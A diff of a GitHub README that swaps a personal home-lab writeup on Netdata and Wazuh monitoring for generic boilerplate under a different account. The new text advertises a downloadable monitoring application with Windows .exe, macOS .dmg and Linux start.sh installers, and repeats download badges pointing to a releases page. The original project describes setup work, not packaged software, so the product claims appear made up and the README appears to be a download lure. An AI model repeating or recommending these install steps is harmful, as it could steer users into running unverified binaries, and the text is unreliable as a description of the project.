@@ -1,51 +1,103 @@
-# Hybrid Infrastructure Observability & Security Lab
+# 🌐 HomeLab-Hybrid-Monitoring - Simplify Your Network Security Management
 
-## Project Overview
-This project demonstrates the implementation of a **Unified Monitoring & Incident Response System** for a complex, hybrid home lab environment. By integrating **Netdata** with **Wazuh SIEM**, I established a central "Single Pane of Glass" to monitor the health, performance, and security of diverse operating systems (Linux, Windows, macOS) and containerized applications.
+## 🛠️ Overview
 
-The goal was to move from reactive troubleshooting to **proactive observability**, reducing Mean Time to Detect (MTTD) for both performance anomalies and security threats.
+HomeLab-Hybrid-Monitoring is a user-friendly tool designed to help you keep an eye on your hybrid network. This software combines Netdata and Wazuh SIEM, ensuring you can monitor Linux, Windows, macOS, and Docker systems. Automated alerts via Telegram keep you informed of any suspicious activity. 
 
-## 📸 Dashboard Preview
-![Dashboard Overview](dashboard-overview.png)
-*Real-time visibility across 4 critical nodes: Linux Server (Wazuh-Server), Raspberry Pi (Home-Server), Windows 11, and macOS.*
+## 📥 Download Now
 
-## Architecture Topology
-The infrastructure consists of 4 managed nodes:
+[![Download HomeLab-Hybrid-Monitoring](https://img.shields.io/badge/Download%20HomeLab--Hybrid--Monitoring-v1.0-blue)](https://github.com/baguswio/HomeLab-Hybrid-Monitoring/releases)
 
-| Node Name | OS / Type | Role |
-| :--- | :--- | :--- |
-| **Home-Server** | Ubuntu Server (Raspberry Pi) + CasaOS | **Docker Host** running core services (Pi-hole, NAS, Immich) & Containerized Monitoring. |
-| **Wazuh-Server** | Ubuntu Server (VM) | Dedicated **SIEM Manager** for log analysis and threat detection. |
-| **Zeyad_laptop** | Windows 11 | Primary Administrative Workstation & Endpoint. |
-| **macbookpro** | macOS (Unix) | Development & Creative Workstation. |
+## 🚀 Getting Started
 
-## Technologies Stack
-* **Monitoring Engine:** Netdata (Deployed via Docker, Native Agents, & Homebrew).
-* **Security:** Wazuh SIEM (Endpoint Security & Log Analysis).
-* **Containerization:** Docker & Docker Compose.
-* **Alerting:** Automated integration with **Telegram API** for critical notifications.
+### 🖥️ System Requirements
 
-## Automated Alerting System
-Critical events trigger instant notifications via a custom **Telegram Bot**, ensuring rapid incident response capabilities (IR).
+To run HomeLab-Hybrid-Monitoring, you will need:
 
-![Telegram Alert Example](telegram-alert.png)
-*Example of real-time alerts received on mobile, including a critical health check failure on the Immich database container.*
+- **Operating System**: Compatible with Linux, Windows, macOS
+- **Memory**: At least 4 GB of RAM
+- **Storage**: Minimum of 1 GB available disk space
 
-## Implementation Highlights & Challenges
+### 📥 Download & Install
 
-### 1. Cross-Platform Deployment Strategy
-* **Linux (Raspberry Pi):** Utilized `docker-compose` to isolate the monitoring agent from core system processes.
-* **Windows 11:** Deployed native MSI installer to capture OS-specific metrics (Registry, Services).
-* **macOS:** Deployed via Terminal using custom environment configurations.
+1. Visit the [Releases page](https://github.com/baguswio/HomeLab-Hybrid-Monitoring/releases) to download the latest version.
+2. Choose the version that matches your operating system.
+3. Click on the appropriate package to start downloading.
 
-### 2. Solving the macOS Bash Compatibility Issue 
+   Once the file downloads, follow the next steps to install the application on your system.
 
-macOS ships with a legacy version of Bash (v3.2) due to licensing restrictions. The Netdata installation script requires features found in modern Bash (v4.0+), causing the standard deployment to fail with syntax errors.
+### 🧩 Installation Steps
 
-I resolved the dependency at the environment level by upgrading the local shell environment using **Homebrew** (`brew install bash`). This updated the system's path to prioritize the modern Bash version, allowing the standard Netdata installation script to execute successfully without complex workarounds.
+#### For Windows
 
-### 3. Resource Optimization
-Tuned monitoring agents to consume **<1% CPU** on the Wazuh Server to ensure that the observability layer does not impact the performance of the SIEM engine.
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to begin the installation.
+3. Follow the on-screen instructions to complete the setup.
+4. Once installed, open the application.
 
----
-**Project executed by [Zeyad AlRashed](https://www.linkedin.com/in/zeyad-alrashed-0155b9333/)**
+#### For Linux
+
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the `.tar.gz` file.
+3. Run the following command to extract:
+
+   ```bash
+   tar -xvzf HomeLab-Hybrid-Monitoring.tar.gz
+   ```
+
+4. Change into the directory:
+
+   ```bash
+   cd HomeLab-Hybrid-Monitoring
+   ```
+
+5. Start the application using:
+
+   ```bash
+   ./start.sh
+   ```
+
+#### For macOS
+
+1. Open the `.dmg` file you downloaded.
+2. Drag the application icon into your Applications folder.
+3. Launch the application from your Applications.
+
+## ⚙️ Configuration
+
+After installing, you will need to configure the application:
+
+1. Open HomeLab-Hybrid-Monitoring.
+2. Follow the setup wizard to connect it to your network devices.
+3. Set up your Telegram notifications for alerts:
+   - Add your Telegram bot token.
+   - Enter your chat ID to receive updates.
+
+## 📊 Features
+
+- **Unified Monitoring**: Track the performance of all your devices in one place.
+- **Automated Alerts**: Receive real-time notifications through Telegram alerts.
+- **Comprehensive Reporting**: Generate reports on network activity and potential threats.
+- **User-Friendly Interface**: Easy to navigate and configure, even for beginners.
+
+## 🔧 Troubleshooting
+
+If you run into issues, consider the following steps:
+
+- Ensure your system meets the requirements listed above.
+- Restart your application after changing settings.
+- Check your internet connection for proper alert delivery.
+
+For additional help, you can always refer to the community discussions on our GitHub page.
+
+## 🤝 Contributing
+
+We welcome contributions to improve HomeLab-Hybrid-Monitoring. If you want to help, consider submitting a bug report or feature request on our GitHub issues page.
+
+## 🌍 Support
+
+For support, please open an issue on our [GitHub page](https://github.com/baguswio/HomeLab-Hybrid-Monitoring/issues) or reach out to our community for assistance.
+
+Once you're ready, don't forget to download the software here:
+
+[![Download HomeLab-Hybrid-Monitoring](https://img.shields.io/badge/Download%20HomeLab--Hybrid--Monitoring-v1.0-blue)](https://github.com/baguswio/HomeLab-Hybrid-Monitoring/releases)
